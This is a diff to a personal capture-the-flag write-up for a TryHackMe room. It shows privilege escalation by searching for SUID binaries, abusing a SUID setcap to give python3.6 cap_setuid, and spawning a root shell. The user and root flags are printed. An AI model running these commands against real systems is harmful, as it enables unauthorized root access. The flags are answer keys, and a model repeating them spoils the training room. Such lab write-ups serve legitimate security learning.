@@ -238,15 +238,44 @@ cat /home/annie/user.txt
 THM{N0t_Ju5t_ANY_D3sk}
 
 ## Privesc
-groups:
+### suid binaries:
 ```
-annie@desktop:/home/annie$ groups
-annie cdrom sudo dip plugdev lpadmin sambashare
+$ find / -type f -perm -04000 -ls 2>/dev/null
+annie@desktop:/home/annie$ find / -type f -perm -04000 -ls 2>/dev/null
+   131142     12 -rwsr-xr-x   1 root     root        10232 Nov 16  2017 /sbin/setcap
+   655379     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
+   655430     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
+   655397     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2022 /bin/su
+   655514     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
+   655423     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
+   803938    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
+   786802     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+   804179    428 -rwsr-xr-x   1 root     root       436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
+   138895     16 -rwsr-xr-x   1 root     root        14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+   138962     12 -rwsr-sr-x   1 root     root        10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
+   799962     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   803534     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
+   788281     40 -rwsr-xr-x   1 root     root          40344 Jan 25  2022 /usr/bin/newgrp
+   799147    148 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /usr/bin/sudo
+   799099     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+   787313     76 -rwsr-xr-x   1 root     root          76496 Jan 25  2022 /usr/bin/chfn
+   787330     76 -rwsr-xr-x   1 root     root          75824 Jan 25  2022 /usr/bin/gpasswd
+   787328     44 -rwsr-xr-x   1 root     root          44528 Jan 25  2022 /usr/bin/chsh
+   787331     60 -rwsr-xr-x   1 root     root          59640 Jan 25  2022 /usr/bin/passwd
+   801215     24 -rwsr-xr-x   1 root     root          22520 Jan 12  2022 /usr/bin/pkexec
 ```
+According to hacktricks, setcat could be used for privesc:
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#privesc-container-escape
 
-crontab: nothing
-
-Trying to move over CVE-2021-4034 exploit. Can't with wget, not downloading file.
-Smaller text files work. Investigate why. Is there some malfunction or should the room work like this?
-
-Let's check if we can login via ssh using the private key in /home/annie/.ssh
+```
+annie@desktop:/home/annie$ setcap cap_setuid+ep /usr/bin/python3.6
+annie@desktop:/home/annie$ getcap /usr/bin/python3.6
+/usr/bin/python3.6 = cap_setuid+ep
+annie@desktop:/home/annie$ /usr/bin/python3.6 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+root@desktop:/home/annie# id
+uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+root@desktop:/home/annie# ls /root
+THM-Voucher.txt  root.txt
+root@desktop:/root# cat root.txt 
+THM{0nly_th3m_5.5.2_D3sk}
+```
